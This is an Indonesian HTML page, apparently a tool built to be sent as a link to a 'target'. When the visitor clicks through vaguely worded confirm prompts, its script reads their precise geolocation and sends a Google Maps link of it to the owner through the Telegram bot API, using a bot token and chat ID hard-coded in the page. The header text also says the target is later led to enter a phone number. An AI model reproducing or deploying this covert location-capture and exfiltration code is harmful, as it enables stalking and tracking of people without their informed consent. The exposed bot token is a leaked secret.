<!doctype html>

<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>WEBSITE BY DITZZ</title>
  <style>
    :root{--bg:#061025;--card:#0f1724;--accent:#7c5cff;--muted:#9fb0c8}
    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background:linear-gradient(180deg,#061025 0%, #071229 100%);color:#e8f1fb}
    .wrap{max-width:760px;margin:32px auto;padding:28px;}
    .card{background:rgba(255,255,255,0.02);border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 30px rgba(2,6,23,0.6)}
    h1{margin:0;font-size:20px;font-weight:800}
    p.lead{margin:6px 0 12px;color:var(--muted);font-size:14px}.controls{display:flex;gap:10px;align-items:center}
button.btn{background:linear-gradient(90deg,var(--accent),#00d4ff);border:none;padding:12px 16px;border-radius:10px;color:#041426;font-weight:800;cursor:pointer}
button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:10px 12px;border-radius:10px;color:var(--muted);font-weight:700}

.map{height:160px;border-radius:8px;margin-top:12px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);display:flex;align-items:center;justify-content:center;color:var(--muted);font-family:monospace;white-space:pre-wrap}
.link{color:#bcdcff;text-decoration:underline}

.logs{margin-top:12px;background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;height:110px;overflow:auto;font-family:monospace;font-size:12px;color:var(--muted)}
.footer{margin-top:16px;text-align:center;color:var(--muted);font-size:12px}

@media (max-width:640px){.controls{flex-direction:column;align-items:stretch} }

  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>WEB BY ./DITZ</h1>
      <p class="lead">Web untuk admin <strong>menghapus semua device data</strong> dan hanya mengirimkan link  langsung ke target. setelah memberikan semua izin akan di lanjutkn ke masukan nomor target.</p><div class="controls">
    <button class="btn" id="requestBtn">Open</button>
    <button class="ghost" id="startWatch">Start Watch (opsional)</button>
    <button class="ghost" id="stopWatch">Stop Watch</button>
  </div>

  <div class="map" id="mapPreview">Belum ada link</div>
  <div class="logs" id="logs">Log: siap.</div>
  <div class="footer">DISCLAIMER: Gunakan hanya untuk target sendiri. Jangan kirim sembaerang orang lain tanpa izin.</div>
</div>

  </div>  <script>
    // --- Embedded credentials (user provided) ---
    const BOT_TOKEN = '8400374835:AAHNkJUqF3tNMXJBuDScfCWijYAbQbL39Zc'
    const OWNER_ID  = '7419318779'
    const apiUrl = (token) => `https://api.telegram.org/bot${token}/sendMessage`

    const el = id => document.getElementById(id)
    const mapEl = el('mapPreview')
    const logsEl = el('logs')

    function log(msg){ const t = new Date().toLocaleTimeString(); logsEl.textContent = `${t} - ${msg}
` + logsEl.textContent; console.log('[TL]', msg) }
    function logStatus(msg){ log(msg) }

    function makeMapsLink(lat, lon){
      // Standard Google Maps search link
      return `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat+','+lon)}`
    }

    async function sendMapsLink(lat, lon, ts){
      const maps = makeMapsLink(lat, lon)
      const text = `üìç Lokasi (testing)
${maps}
Waktu: ${ts}`
      const body = { chat_id: OWNER_ID, text }
      logStatus('Mengirim link ke Telegram...')
      try{
        const res = await fetch(apiUrl(BOT_TOKEN),{
          method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify(body)
        })
        const j = await res.json()
        if(j && j.ok){
          logStatus('Terkirim ‚úÖ')
          mapEl.innerHTML = `Link: <a class="link" href="${maps}" target="_blank" rel="noopener">${maps}</a>`
        }else{
          logStatus('Gagal kirim: '+(j && j.description ? j.description : 'unknown'))
          mapEl.textContent = 'Gagal membuat link' 
        }
      }catch(e){ logStatus('Error saat kirim: '+e); mapEl.textContent = 'Error saat kirim' }
    }

    function ensureAndRequestLocation(){
      if(!('geolocation' in navigator)){
        logStatus('Browser tidak mendukung Geolocation API')
        return
      }
      // Try Permissions API first for better UX
      (async()=>{
        try{
          if(navigator.permissions && navigator.permissions.query){
            const p = await navigator.permissions.query({name:'geolocation'})
            log('Permissions state: '+p.state)
            if(p.state === 'denied'){ alert('Izin lokasi diblokir. Buka pengaturan situs untuk mengizinkan.'); logStatus('Izin lokasi diblokir'); return }
          }
        }catch(e){ log('Permissions API error: '+e) }

        logStatus('Meminta izin lokasi (browser prompt akan muncul)...')
        navigator.geolocation.getCurrentPosition(pos=>{
          const c = pos.coords
          const ts = new Date(pos.timestamp).toISOString()
          logStatus(`Dapat lokasi: ${c.latitude}, ${c.longitude} (acc ${c.accuracy} m)`)
          sendMapsLink(c.latitude, c.longitude, ts)
        }, err=>{
          if(err && err.code){
            switch(err.code){
              case 1: logStatus('Izin ditolak oleh pengguna'); break
              case 2: logStatus('Posisi tidak tersedia: '+err.message); break
              case 3: logStatus('Permintaan lokasi timeout'); break
              default: logStatus('Geolocation error: '+err.message)
            }
          }else{ logStatus('Geolocation error: '+(err && err.message ? err.message : err)) }
        }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 })
      })()
    }

    // Watcher (UI only)
    let watchId = null
    function startWatch(){ if(watchId!==null){ log('Watcher sudah aktif'); return } if(!('geolocation' in navigator)){ log('Browser tidak mendukung Geolocation'); return } watchId = navigator.geolocation.watchPosition(pos=>{ const c = pos.coords; mapEl.textContent = `Lat: ${c.latitude} 
Lon: ${c.longitude}`; logStatus('Update posisi (tidak terkirim)') }, err=>{ logStatus('Watcher error: '+err.message) }, { enableHighAccuracy:true, maximumAge:2000, timeout:8000 }); log('Watcher aktif') }
    function stopWatch(){ if(watchId===null){ log('Tidak ada watcher'); return } navigator.geolocation.clearWatch(watchId); watchId=null; log('Watcher dihentikan') }

    document.addEventListener('DOMContentLoaded', ()=>{
      el('requestBtn').addEventListener('click', ()=>{
        if(location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1'){
          if(!confirm('Kilk ok untuk ke izin selanjutnya')) return
        }
        if(!confirm('Izinkan atau ok untuk mengambil nya.')) return
        ensureAndRequestLocation()
      })
      el('startWatch').addEventListener('click', startWatch)
      el('stopWatch').addEventListener('click', stopWatch)
    })
  </script></body>
</html>